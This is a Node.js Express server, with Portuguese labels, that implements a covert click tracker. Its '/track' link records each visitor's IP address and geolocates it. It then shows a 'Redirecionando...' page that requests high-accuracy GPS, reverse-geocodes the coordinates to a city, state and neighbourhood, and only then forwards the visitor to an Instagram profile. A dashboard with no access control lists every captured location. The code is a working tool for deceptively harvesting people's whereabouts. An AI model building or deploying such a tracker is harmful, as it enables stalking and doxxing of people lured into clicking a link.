const express = require('express');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());

const clicks = [];

function getIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0] || 
         req.headers['x-real-ip'] || 
         req.connection.remoteAddress;
}

// Dashboard
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Dashboard</title>
      <style>
        body { font-family: Arial; padding: 20px; background: #f5f5f5; }
        .header { background: white; padding: 20px; margin-bottom: 20px; }
        .btn { background: #4CAF50; color: white; padding: 10px 20px; border: none; cursor: pointer; margin: 5px; }
        .card { background: white; padding: 15px; margin: 10px 0; }
        .stats { font-size: 24px; font-weight: bold; }
      </style>
    </head>
    <body>
      <div class="header">
        <h1>Dashboard de Rastreamento</h1>
        <a href="/track" class="btn">Link de Rastreamento</a>
        <button class="btn" onclick="loadData()">Atualizar</button>
      </div>
      
      <div class="card">
        <div class="stats" id="total">0 cliques</div>
      </div>
      
      <div id="clicks"></div>
      
      <script>
        async function loadData() {
          const res = await fetch('/api/stats');
          const data = await res.json();
          
          document.getElementById('total').textContent = data.total + ' cliques';
          
          const html = data.clicks.map(c => {
            const loc = c.location || c.ipLocation;
            return \`
              <div class="card">
                <p><strong>Data:</strong> \${new Date(c.timestamp).toLocaleString('pt-BR')}</p>
                <p><strong>IP:</strong> \${c.ip}</p>
                \${loc ? \`
                  <p><strong>Cidade:</strong> \${loc.cidade}</p>
                  <p><strong>Estado:</strong> \${loc.estado}</p>
                  <p><strong>Bairro:</strong> \${loc.bairro}</p>
                \` : '<p>Localização não disponível</p>'}
              </div>
            \`;
          }).join('');
          
          document.getElementById('clicks').innerHTML = html;
        }
        
        loadData();
        setInterval(loadData, 5000);
      </script>
    </body>
    </html>
  `);
});

// Página de rastreamento
app.get('/track', async (req, res) => {
  const clickData = {
    id: clicks.length + 1,
    ip: getIP(req),
    timestamp: new Date().toISOString(),
    location: null,
    ipLocation: null
  };
  
  clicks.push(clickData);
  console.log('Novo clique ID:', clickData.id, 'IP:', clickData.ip);
  
  // Busca localização por IP
  (async () => {
    try {
      const ipClean = clickData.ip.replace('::ffff:', '').trim();
      const response = await fetch(`http://ip-api.com/json/${ipClean}?lang=pt&fields=status,country,regionName,city,lat,lon`);
      const ipData = await response.json();
      
      if (ipData.status === 'success') {
        const click = clicks.find(c => c.id === clickData.id);
        if (click) {
          click.ipLocation = {
            cidade: ipData.city || 'N/A',
            estado: ipData.regionName || 'N/A',
            bairro: 'N/A'
          };
          console.log('IP Location:', ipData.city, ipData.regionName);
        }
      }
    } catch (error) {
      console.error('Erro IP:', error.message);
    }
  })();
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Redirecionando</title>
    </head>
    <body>
      <h1>Redirecionando...</h1>
      <script>
        const clickId = ${clickData.id};
        
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            async (pos) => {
              const data = {
                clickId: clickId,
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                accuracy: pos.coords.accuracy
              };
              
              try {
                await fetch('/api/save-gps', {
                  method: 'POST',
                  headers: {'Content-Type': 'application/json'},
                  body: JSON.stringify(data)
                });
              } catch (e) {}
              
              window.location.href = 'https://www.instagram.com/andre.osantos12/';
            },
            () => {
              window.location.href = 'https://www.instagram.com/andre.osantos12/';
            },
            { enableHighAccuracy: true, timeout: 5000 }
          );
        } else {
          window.location.href = 'https://www.instagram.com/andre.osantos12/';
        }
      </script>
    </body>
    </html>
  `);
});

// Salvar GPS
app.post('/api/save-gps', async (req, res) => {
  try {
    const { clickId, lat, lng, accuracy } = req.body;
    
    const click = clicks.find(c => c.id === clickId);
    if (!click) {
      return res.json({ success: false });
    }
    
    console.log('GPS recebido:', lat, lng, 'Precisão:', accuracy);
    
    // Busca endereço - Nominatim
    try {
      const response = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&addressdetails=1`,
        { headers: { 'User-Agent': 'GPSTracker' } }
      );
      
      const data = await response.json();
      console.log('Nominatim retornou:', JSON.stringify(data.address, null, 2));
      
      if (data && data.address) {
        const addr = data.address;
        
        click.location = {
          cidade: addr.city || addr.town || addr.village || addr.municipality || addr.county || 'N/A',
          estado: addr.state || 'N/A',
          bairro: addr.suburb || addr.neighbourhood || addr.district || 'N/A'
        };
        
        console.log('Endereço salvo:', click.location.cidade, click.location.estado, click.location.bairro);
      }
    } catch (error) {
      console.error('Erro ao buscar endereço:', error.message);
    }
    
    res.json({ success: true });
  } catch (error) {
    console.error('Erro:', error);
    res.json({ success: false });
  }
});

// Stats API
app.get('/api/stats', (req, res) => {
  res.json({
    total: clicks.length,
    clicks: clicks.reverse()
  });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('Servidor rodando na porta', PORT);
});
